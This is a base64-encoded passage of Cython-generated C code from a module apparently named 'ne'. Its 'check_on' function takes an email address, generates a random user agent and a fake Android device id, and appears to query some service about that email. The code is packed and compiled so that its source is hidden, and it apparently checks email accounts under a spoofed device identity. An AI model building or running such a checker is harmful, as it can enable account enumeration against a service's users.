X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fcHl4X3IgPSBfX3B5eF90XzE7CiAgICBfX3B5eF90XzEgPSAwOwogICAgZ290byBfX3B5eF9MMDsKCiAgICAKICB9CgogIAogIF9fcHl4X3RfMSA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdmFsdWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMDAwLCBQeV9HRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzQ1LCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzIgPCAwKSkpIF9fUFlYX0VSUigwLCAzNDUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIGlmIChfX3B5eF90XzIpIHsKCiAgICAKICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMoX19weXhfdl92YWx1ZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwMDAsIDB4M0U4LCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzQ2LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRm9ybWF0KF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xZik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM0NiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19weXhfdF8xID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfayk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM0NiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19weXhfciA9IF9fcHl4X3RfMTsKICAgIF9fcHl4X3RfMSA9IDA7CiAgICBnb3RvIF9fcHl4X0wwOwoKICAgIAogIH0KCiAgCiAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICBfX3B5eF90XzEgPSBfX1B5eF9QeU51bWJlcl9JbnQoX19weXhfdl92YWx1ZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM0NywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzNDcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIF9fcHl4X3IgPSBfX3B5eF90XzM7CiAgX19weXhfdF8zID0gMDsKICBnb3RvIF9fcHl4X0wwOwoKICAKCiAgCiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS5mb3JtYXRfbnVtYmVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl92YWx1ZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5lXzE1Y2hlY2tfb24oUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ybmVfMTVjaGVja19vbiA9IHsiY2hlY2tfb24iLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJuZV8xNWNoZWNrX29uLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJuZV8xNWNoZWNrX29uKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopIHsKICBQeU9iamVjdCAqX19weXhfdl9lbWFpbCA9IDA7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJnczsKICAjZW5kaWYKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjaGVja19vbiAod3JhcHBlcikiLCAwKTsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpOwogICNlbHNlCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDsKICAjZW5kaWYKICAjZW5kaWYKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICB7CiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbWFpbCwwfTsKICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwOwogICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAzNTAsIF9fcHl4X0wzX2Vycm9yKQogICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkgewogICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7CiAgICAgICAgY2FzZSAgMToKICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMzUwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMDogYnJlYWs7CiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgICAgfQogICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzOwogICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiY2hlY2tfb24iLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM1MCwgX19weXhfTDNfZXJyb3IpCiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImNoZWNrX29uIiwgMSwgMSwgMSwgaSk7IF9fUFlYX0VSUigwLCAzNTAsIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHsKICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgIH0gZWxzZSB7CiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMzUwLCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3ZfZW1haWwgPSB2YWx1ZXNbMF07CiAgfQogIGdvdG8gX19weXhfTDZfc2tpcDsKICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7CiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImNoZWNrX29uIiwgMSwgMSwgMSwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMzUwLCBfX3B5eF9MM19lcnJvcikKICBfX3B5eF9MNl9za2lwOjsKICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOwogIF9fcHl4X0wzX2Vycm9yOjsKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X0FkZFRyYWNlYmFjaygibmUuY2hlY2tfb24iLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJuZV8xNGNoZWNrX29uKF9fcHl4X3NlbGYsIF9fcHl4X3ZfZW1haWwpOwoKICAKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJuZV8xNGNoZWNrX29uKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdWEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2RldiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZGV2aWNlX2lkID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl91dWkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2RhdGEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3Jlc3BvbnNlID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBzaXplX3QgX19weXhfdF80OwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDsKICBpbnQgX19weXhfdF8xMTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjaGVja19vbiIsIDApOwoKICAKICBfX3B5eF90XzIgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM1MiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF80ID0gMTsKICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMykpKSB7CiAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzMpOwogICAgYXNzZXJ0KF9fcHl4X3RfMik7CiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzMsIF9fcHl4X19mdW5jdGlvbik7CiAgICBfX3B5eF90XzQgPSAwOwogIH0KICAjZW5kaWYKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzUyLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBfX3B5eF92X3VhID0gX19weXhfdF8xOwogIF9fcHl4X3RfMSA9IDA7CgogIAogIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FuZHJvaWQpOwogIF9fcHl4X3ZfZGV2ID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hbmRyb2lkOwoKICAKICBfX3B5eF90XzUgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGFzaGxpYik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDM1NCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tZDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNTQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogIF9fcHl4X3RfOCA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMzU0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzNTQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICBfX3B5eF90XzQgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xMCkpKSB7CiAgICBfX3B5eF90XzggPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEwKTsKICAgIGFzc2VydChfX3B5eF90XzgpOwogICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEwKTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTAsIF9fcHl4X19mdW5jdGlvbik7CiAgICBfX3B5eF90XzQgPSAwOwogIH0KICAjZW5kaWYKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF84LCBOVUxMfTsKICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDEtX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzU0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIH0KICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzU0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgX19weXhfdF82ID0gUHlVbmljb2RlX0FzRW5jb2RlZFN0cmluZygoKFB5T2JqZWN0KilfX3B5eF90XzEwKSwgTlVMTCwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDM1NCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICBfX3B5eF90XzQgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHsKICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNyk7CiAgICBhc3NlcnQoX19weXhfdF81KTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfNCA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfNn07CiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzU0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIH0KICBfX3B5eF90XzMgPSBfX3B5eF90XzI7CiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF80ID0gMDsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBOVUxMfTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZXhkaWdlc3QsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDEtX19weXhfdF80KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNTQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgfQogIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0dldFNsaWNlKF9fcHl4X3RfMSwgMCwgMTYsIE5VTEwsIE5VTEwsICZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9zbGljZVswXSwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM1NCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgX19weXhfdF8xID0gUHlOdW1iZXJfQWRkKF9fcHl4X3ZfZGV2LCBfX3B5eF90XzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNTQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3ZfZGV2aWNlX2lkID0gX19weXhfdF8xOwogIF9fcHl4X3RfMSA9IDA7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzU1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3V1aWQ0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzU1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX3B5eF90XzQgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHsKICAgIF9fcHl4X3RfMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNyk7CiAgICBhc3NlcnQoX19weXhfdF8yKTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfNCA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIE5VTEx9OwogICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgxLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1